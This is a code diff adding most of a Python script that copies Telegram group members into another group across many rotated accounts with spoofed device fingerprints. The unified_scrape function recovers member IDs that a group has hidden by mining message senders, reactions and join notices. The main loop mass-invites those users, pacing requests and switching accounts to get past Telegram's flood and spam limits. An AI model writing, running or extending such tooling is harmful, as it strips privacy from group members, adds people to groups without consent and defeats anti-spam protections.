+                if not (1 <= num <= len(accounts)):
+                    fail(f'Number must be between 1 and {len(accounts)}. Try again.')
+                    continue
+                picked = [accounts[num - 1]]
+
+            ok(f'Selected {len(picked)} account(s).')
+            return picked
+        except (ValueError, IndexError):
+            fail(f'Did not understand "{raw}". Example: 1-10  or  3  or  all')
+
+
+# ============= SETTINGS FLOW (with confirmation gate) =============
+
+def collect_settings(accounts):
+    """Guided setup. Re-runs from the top if the user rejects the summary."""
+    while True:
+        section('STEP 1/4 · SOURCE GROUP')
+        info('This is the group we COPY members FROM.')
+        source = ask_link('Paste the source group link or @username')
+
+        section('STEP 2/4 · TARGET GROUP')
+        info('This is YOUR group where members will be ADDED.')
+        target = ask_link('Paste the target group link or @username')
+
+        if source == target:
+            warn('Source and target are the same group — this is usually a mistake.')
+            if not ask_yesno('Continue anyway?', default_yes=False):
+                continue
+
+        section('STEP 3/4 · SPEED & SIZE')
+        info('Waiting 30 seconds between adds keeps accounts safe.')
+        sleep_t = ask_number('Seconds to wait between each add', default=30, minimum=0, maximum=3600)
+        msg_limit = ask_number('How many messages to scan for members (0 = all)',
+                               default=5000, minimum=0, maximum=2_000_000)
+
+        section('STEP 4/4 · ACCOUNTS')
+        to_use = select_accounts(accounts)
+
+        cfg = {'source': source, 'target': target, 'sleep': sleep_t,
+               'limit': msg_limit, 'accounts': to_use}
+
+        if confirm_start(cfg):
+            return source, target, sleep_t, msg_limit, to_use
+
+        while True:
+            ans = input(f'{_ye}  Type {_w}r{_ye} to re-enter settings, or {_w}q{_ye} to quit: {_n}').strip().lower()
+            if ans in ('r', ''):
+                break
+            if ans in ('q', 'quit', 'exit'):
+                fail('Cancelled by user.')
+                sys.exit(0)
+
+
+# ============= USER VALIDATION =============
+
+def valid_user(uo):
+    if not uo or not hasattr(uo, 'id') or uo.id is None:
+        return False
+    if getattr(uo, 'deleted', False):
+        return False
+    if getattr(uo, 'is_bot', False):
+        return False
+    if getattr(uo, 'is_self', False):
+        return False
+    return True
+
+
+# ============= LINK HELPERS =============
+
+def is_invite_link(link):
+    return '/joinchat/' in link or 't.me/+' in link
+
+
+def invite_hash(link):
+    tail = link.rstrip('/').split('/')[-1]
+    if tail.startswith('+'):
+        tail = tail[1:]
+    return tail if tail else None
+
+
+# ============= SCRAPE =============
+
+def print_progress_bar(current, total, ids):
+    if total <= 0:
+        total = current
+    percent = min(100, int((current / total) * 100))
+    filled = percent // 10
+    bar = '█' * filled + '░' * (10 - filled)
+    print(f'{_i}{_lg} [{bar}] {percent}% | {current}/{total} msgs | IDs:{ids} ')
+
+
+def unified_scrape(client, source_entity, msg_limit, target=0, offset_id=0, exclude=None):
+    """
+    Sliced-baton scraper.
+    Returns (ordered_user_list, last_msg_id, api_mode)
+
+    If the API returns fewer than MIN_API_MEMBERS, the real member list
+    is probably hidden (only the owner is visible). Those few members are
+    KEPT and the history scan ALSO runs, then everything is merged.
+    """
+    members = {}
+    hidden_ids = set()
+    msg_count = 0
+    last_id = offset_id or 0
+    ex = exclude if exclude is not None else set()
+
+    def new_count():
+        return sum(1 for uid in members if uid not in ex)
+
+    print(f'{_i}{_lg} Checking if the member list is visible...')
+    api_mode = False
+    try:
+        for u in client.get_participants(source_entity):
+            if valid_user(u):
+                members[u.id] = u
+        if len(members) >= MIN_API_MEMBERS:
+            ok(f'Found {len(members)} members directly!')
+            return list(members.values()), last_id, True
+        if members:
+            info(f'Member list looks hidden (only {len(members)} visible). '
+                 f'Scanning message history too...')
+        else:
+            info('Member list is hidden. Reading message history instead...')
+    except ChatAdminRequiredError:
+        info('Member list is hidden. Reading message history instead...')
+    except Exception:
+        info('Direct list unavailable. Reading message history instead...')
+
+    print(f'{_i}{_lg} Scanning history (Limit: {_w}{msg_limit or "all"}{_lg} | '
+          f'From offset: {_w}{offset_id or "newest"}{_lg})...')
+
+    iter_limit = msg_limit if (msg_limit and msg_limit > 0) else None
+
+    for msg in client.iter_messages(source_entity, limit=iter_limit, offset_id=(offset_id or 0)):
+        if msg is None:
+            continue
+        msg_count += 1
+        last_id = msg.id
+        if msg_count % 500 == 0:
+            print_progress_bar(msg_count, iter_limit or msg_count, len(members))
+
+        if msg.sender and valid_user(msg.sender) and msg.sender.id not in members:
+            members[msg.sender.id] = msg.sender
+
+        # Reactions -> hidden reactor IDs
+        if getattr(msg, 'reactions', None):
+            try:
+                for react in msg.reactions.results:
+                    reactors = getattr(react, 'recent_reactors', None)
+                    if reactors:
+                        for reactor in reactors:
+                            rid = getattr(reactor, 'user_id', None)
+                            if rid and rid not in members:
+                                hidden_ids.add(rid)
+            except Exception:
+                pass
+
+        # Service actions (joins/invites) -> user IDs
+        action = getattr(msg, 'action', None)
+        if action is not None:
+            try:
+                users = getattr(action, 'users', None)
+                if users:
+                    if isinstance(users, (list, tuple)):
+                        for u in users:
+                            uid = u if isinstance(u, int) else getattr(u, 'id', None)
+                            if uid and uid not in members:
+                                hidden_ids.add(uid)
+                    else:
+                        uid = getattr(users, 'id', None)
+                        if uid and uid not in members:
+                            hidden_ids.add(uid)
+                uid = getattr(action, 'user_id', None)
+                if uid and uid not in members:
+                    hidden_ids.add(uid)
+            except Exception:
+                pass
+
+        if target and new_count() >= target:
+            print(f'\n{_s}{_lg} Found enough users after {_w}{msg_count}{_lg} messages.')
+            break
+
+    print(f'\n{_i}{_lg} Scan done: {_w}{len(members)}{_lg} known users '
+          f'& {_w}{len(hidden_ids)}{_lg} hidden IDs.')
+
+    # Only pay for the expensive hidden-ID fetch if we're still short of target
+    if hidden_ids and (not target or new_count() < target):
+        info(f'Fetching {len(hidden_ids)} hidden user objects...')
+        hidden_list = list(hidden_ids)
+        try:
+            fetched = client.get_entities(hidden_list)
+            for u in fetched:
+                if valid_user(u):
+                    members[u.id] = u
+        except Exception:
+            for uid in hidden_list:
+                if uid not in members:
+                    try:
+                        u = client.get_entity(uid)
+                        if valid_user(u):
+                            members[u.id] = u
+                    except Exception:
+                        pass
+
+    return list(members.values()), last_id, api_mode
+
+
+# ============= JOIN HELPER =============
+
+def join_group(client, link, label, account_phone, account_name):
+    """Returns: 'ok', 'skip_account', or 'fatal'."""
+    try:
+        if is_invite_link(link):
+            h = invite_hash(link)
+            if not h:
+                fail(f'Invalid invite link: {link}')
+                return 'skip_account'
+            try:
+                client(ImportChatInviteRequest(h))
+                ok(f'{account_name} joined the {label} group')
+            except UserAlreadyParticipantError:
+                pass
+            except InviteRequestSentError:
+                fail(f'{account_name} join request is pending admin approval. '
+                     f'Skipping this account until it is approved.')
+                return 'skip_account'
+            except (InviteHashExpiredError, ChannelPrivateError):
+                fail(f'Account {account_phone} cannot join the {label} group. Skipping account...')
+                return 'skip_account'
+        else:
+            try:
+                client(JoinChannelRequest(link))
+                ok(f'{account_name} joined the {label} group')
+            except UserAlreadyParticipantError:
+                pass
+            except ChannelPrivateError:
+                fail(f'Account {account_phone} cannot join private {label} channel. Skipping account...')
+                return 'skip_account'
+        return 'ok'
+    except Exception:
+        fail(f'Account {account_phone} failed to join {label}. Skipping account...')
+        return 'skip_account'
+
+
+# ============= MAIN =============
+
+def main():
+    print_banner()
+    line()
+
+    accounts = load_accounts()
+    if not accounts:
+        fail(f'No profiles found in {DATABASE}!')
+        sys.exit(1)
+
+    os.makedirs(SESSIONS_DIR, exist_ok=True)
+
+    # ---- State ----
+    state = {
+        'source_link': '', 'target_link': '', 'sleep_time': 30,
+        'message_limit': 5000, 'account_index': 0, 'member_index': 0,
+        'offset_current': 0, 'offset_next': 0,
+        'failed_users': [], 'used_users': [], 'generic_fail_users': {},
+    }
+
+    failed_users = set()
+    used_users = set()
+    generic_fails = {}
+    member_index_local = 0
+    start_k = 0
+    off_next = 0
+    off_current = 0
+    history_done = False
+
+    # ---- Resume or fresh setup ----
+    saved = load_session()
+    if saved:
+        if ask_yesno('A previous session was found. Continue it?', default_yes=True):
+            saved_clean = {k: saved[k] for k in state if k in saved}
+            state.update(saved_clean)
+            source = state['source_link']
+            target = state['target_link']
+            sleep_t = state['sleep_time']
+            msg_limit = state['message_limit']
+            member_index_local = state.get('member_index', 0)
+            start_k = state.get('account_index', 0)
+            off_next = state.get('offset_next', 0)
+            off_current = state.get('offset_current', 0)
+            failed_users = set(state.get('failed_users', []))
+            used_users = set(state.get('used_users', []))
+            generic_fails = dict(state.get('generic_fail_users', {}))
+            to_use = accounts[:]
+        else:
+            if os.path.exists(SESSION_FILE):
+                os.remove(SESSION_FILE)
+            source, target, sleep_t, msg_limit, to_use = collect_settings(accounts)
+    else:
+        source, target, sleep_t, msg_limit, to_use = collect_settings(accounts)
+
+    # Guard: a saved index beyond the account list is meaningless — start fresh
+    if start_k >= len(to_use):
+        info('Saved session is already complete. Starting fresh settings.')
+        start_k = 0
+        member_index_local = 0
+        off_next = 0
+        off_current = 0
+        source, target, sleep_t, msg_limit, to_use = collect_settings(accounts)
+
+    state['source_link'] = source
+    state['target_link'] = target
+    state['sleep_time'] = sleep_t
+    state['message_limit'] = msg_limit
+
+    # ---- Budget split across accounts ----
+    if msg_limit and msg_limit > 0:
+        share = max(400, msg_limit // max(1, len(to_use)))
+    else:
+        share = 0
+
+    print()
+    info('Mode: SLICED-BATON SCRAPE (each account scans a different part, no repeats)')
+    info(f'Source: {source}  |  Target: {target}')
+    info(f'Accounts: {len(to_use)} | Sleep: {sleep_t}s | Adds per account: {PER_ACCOUNT_LIMIT}')
+    info(f'Message budget: {msg_limit} -> per account: {share or "unlimited"}')
+    line()
+
+    def save_state():
+        """Single save point — always saves every field, atomically."""
+        state['account_index'] = current_k
+        state['member_index'] = member_index_local
+        state['offset_next'] = off_next
+        state['offset_current'] = off_current
+        state['failed_users'] = list(failed_users)
+        state['used_users'] = list(used_users)
+        state['generic_fail_users'] = generic_fails
+        tmp = SESSION_FILE + '.tmp'
+        try:
+            with open(tmp, 'w') as f:
+                json.dump(state, f, indent=2)
+                f.flush()
+                os.fsync(f.fileno())
+            os.replace(tmp, SESSION_FILE)
+        except Exception:
+            pass
+
+    added_total = 0
+    skipped_total = 0
+    invalid_total = 0
+    save_interval = 10
+    save_counter = 0
+
+    # ===== OUTER LOOP: PER ACCOUNT =====
+    current_k = start_k
+    while current_k < len(to_use):
+        acct = to_use[current_k]
+        phone = acct.get('phone', 'Unknown')
+
+        client = TelegramClient(
+            os.path.join(SESSIONS_DIR, phone),
+            AI_API_ID,
+            AI_API_HASH,
+            device_model=acct.get('device_model', 'Samsung Galaxy A10'),
+            system_version=acct.get('system_version', 'Android 9.0.0'),
+            app_version=acct.get('app_version', '8.0.0')
+        )
+
+        try:
+            client.start(phone=phone)
+        except Exception:
+            fail(f'Could not start session for {phone}. Skipping account.')
+            current_k += 1
+            continue
+
+        acct_name = client.get_me().first_name or "User"
+        print(f'\n{_p}{_grey} ===== Account {current_k + 1}/{len(to_use)}: '
+              f'{_cy}{acct_name}{_lg} ({phone}) ====={_n}')
+
+        # ---- Join source ----
+        if join_group(client, source, 'source', phone, acct_name) != 'ok':
+            client.disconnect()
+            current_k += 1
+            continue
+
+        # ---- Join target ----
+        status = join_group(client, target, 'target', phone, acct_name)
+        if status == 'fatal':
+            save_state()
+            client.disconnect()
+            sys.exit(1)
+        if status != 'ok':
+            client.disconnect()
+            current_k += 1
+            continue
+
+        # ---- Resolve entities ----
+        try:
+            target_entity = client.get_entity(target)
+            target_peer = client.get_input_entity(target)
+        except Exception:
+            fail(f'Could not resolve target for {phone}. Skipping account.')
+            client.disconnect()
+            current_k += 1
+            continue
+
+        # ---- Warm-up ----
+        try:
+            client.get_dialogs(limit=50)
+        except Exception:
+            pass
+
+        # ---- Baton: assign slice (history mode) ----
+        resumed_slice = (current_k == start_k and member_index_local > 0)
+        off_for_me = off_current if resumed_slice else off_next
+        if not resumed_slice:
+            off_current = off_next
+
+        try:
+            source_entity = client.get_entity(source)
+        except Exception:
+            fail(f'{phone} could not open the source group. Skipping account.')
+            client.disconnect()
+            current_k += 1
+            continue
+
+        info(f'{acct_name} is scanning its own slice of the group...')
+        try:
+            user_list, last_id, api_mode = unified_scrape(
+                client, source_entity, share,
+                target=(PER_ACCOUNT_LIMIT + ADD_BUFFER),
+                offset_id=off_for_me,
+                exclude=(failed_users | used_users)
+            )
+        except FloodWaitError as e:
+            warn(f'Telegram asked {acct_name} to wait {e.seconds}s. '
+                 f'Stopped. Run again later to continue.')
+            save_state()
+            client.disconnect()
+            current_k = len(to_use) + 1   # exit loop WITHOUT overwriting the save
+            continue
+
+        # Baton advance: next account continues AFTER this slice (history mode)
+        off_next = last_id
+        save_state()
+
+        # ---- Build the work list ----
+        if api_mode:
+            base = current_k * PER_ACCOUNT_LIMIT
+            window = user_list[base:base + PER_ACCOUNT_LIMIT]
+            work = [u for u in window
+                    if u.id not in failed_users and u.id not in used_users]
+            print(f'{_s}{_lg} {acct_name} -- Member list visible: '
+                  f'window [{base} -> {base + PER_ACCOUNT_LIMIT}] '
+                  f'({len(work)} new users){_n}')
+        else:
+            work = [u for u in user_list
+                    if u.id not in failed_users and u.id not in used_users]
+            print(f'{_s}{_lg} {acct_name} -- Slice scanned: {_w}{len(user_list)}{_lg} users '
+                  f'(baton at msg {_w}{last_id}){_n}')
+
+        if not work:
+            if api_mode:
+                warn('This window had no new users. Next account takes the next window...')
+                client.disconnect()
+                current_k += 1
+                continue
+            if last_id == off_for_me:
+                warn('Reached the end of the group history. Run complete.')
+                history_done = True
+                client.disconnect()
+                break
+            warn('This slice had no new users. Next account continues deeper...')
+            client.disconnect()
+            current_k += 1
+            continue
+
+        info(f'New users for this account: {len(work)}')
+
+        print(f'{_p}{_grey} {acct_name} -- Starting to add users...{_n}')
+        peerflood_count = 0
+        success = 0
+        stop_reason = None
+
+        win_start = member_index_local if (api_mode and resumed_slice) else 0
+        member_index_local = win_start
+
+        # ===== INNER LOOP: PER USER (manual index so FloodWait retries same user) =====
+        j = win_start
+        end = len(work)
+
+        while j < end:
+            uo = work[j]
+            member_index_local = j + 1
+
+            if not api_mode and success >= PER_ACCOUNT_LIMIT:
+                stop_reason = 'limit'
+                break
+
+            if not valid_user(uo):
+                failed_users.add(uo.id)
+                invalid_total += 1
+                j += 1
+                continue
+
+            if uo.id in failed_users or uo.id in used_users:
+                invalid_total += 1
+                j += 1
+                continue
+
+            if generic_fails.get(uo.id, 0) >= MAX_GENERIC_FAILURES:
+                failed_users.add(uo.id)
+                skipped_total += 1
+                j += 1
+                continue
+
+            if peerflood_count >= PEERFLOOD_TOLERANCE:
+                save_state()
+                stop_reason = 'peerflood'
+                time.sleep(20)
+                break
+
+            try:
+                client(InviteToChannelRequest(target_peer, [uo]))
+                print(f'{_p}{_grey} {_cy}{acct_name}{_lg} -- '
+                      f'{_cy}{uo.first_name or "Unknown"}{_lg} --> '
+                      f'{_cy}{target_entity.title}{_n}')
+                added_total += 1
+                success += 1
+                used_users.add(uo.id)
+                generic_fails.pop(uo.id, None)
+                j += 1
+
+                save_counter += 1
+                if save_counter >= save_interval:
+                    save_state()
+                    save_counter = 0
+
+                if sleep_t > 0:
+                    time.sleep(sleep_t)
+
+            except PeerFloodError:
+                # Silent count only; switch account at the tolerance limit
+                peerflood_count += 1
+                failed_users.add(uo.id)
+                save_state()
+                time.sleep(15)
+                if peerflood_count >= PEERFLOOD_TOLERANCE:
+                    stop_reason = 'peerflood'
+                    break
+
+            except (UserPrivacyRestrictedError, UserDeactivatedBanError, UserRestrictedError):
+                failed_users.add(uo.id)
+                skipped_total += 1
+                j += 1
+
+            except UserAlreadyParticipantError:
+                used_users.add(uo.id)
+                skipped_total += 1
+                j += 1
+
+            except FloodWaitError as e:
+                if e.seconds > FLOODWAIT_THRESHOLD:
+                    save_state()
+                    stop_reason = 'floodwait'
+                    break
+                time.sleep(e.seconds + 1)
+                # do NOT advance j -> retry the same user silently
+
+            except Exception:
+                # Silent: count the failure, never spam the console
+                generic_fails[uo.id] = generic_fails.get(uo.id, 0) + 1
+                skipped_total += 1
+                # FIX #7: failures now count toward the save interval so retry
+                # counters survive a crash
+                save_counter += 1
+                if save_counter >= save_interval:
+                    save_state()
+                    save_counter = 0
+                j += 1
+
+        # ---- Slice finished -> save + next account ----
+        save_state()
+        client.disconnect()
+
+        # Simple stop messages — no scary error text
+        if stop_reason == 'peerflood':
+            warn(f'{acct_name} stopped after adding {success} users. '
+                 f'Account needs rest — moving to the next one.')
+        elif stop_reason == 'floodwait':
+            warn(f'{acct_name} stopped after adding {success} users. '
+                 f'Telegram says slow down — moving to the next one.')
+        else:
+            print(f'{_i}{_lg} {acct_name} -- Done. Added {_w}{success}{_lg} users.')
+
+        if history_done:
+            break
+
+        if current_k < len(to_use) - 1:
+            warn(f'Resting {INTER_ACCOUNT_DELAY}s before the next account...')
+            time.sleep(INTER_ACCOUNT_DELAY)
+
+        current_k += 1
+
+    # ===== SUMMARY =====
+    print(f'\n{_grey}-' * 50)
+    print(f'{_s}{_lg} COMPLETE!{_n}')
+    print(f'{_i}{_lg} Successfully added: {_w}{added_total}')
+    print(f'{_i}{_lg} Skipped: {_w}{skipped_total}')
+    print(f'{_i}{_lg} Invalid: {_w}{invalid_total}')
+    print(f'{_i}{_lg} Total unique users handled: {_w}{len(used_users | failed_users)}')
+    print(f'{_i}{_lg} Final baton (last msg scanned): {_w}{off_next}')
+
+    if history_done and os.path.exists(SESSION_FILE):
+        os.remove(SESSION_FILE)
+
+    print(f'\n{_s}{_lg} All sessions closed.{_n}')
+
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f'\n{_e}{_r} Stopped by user.')
+        print(f'{_i}{_lg} Session saved — you can continue next time!{_n}')
+        sys.exit(0)
+    except SystemExit:
+        raise
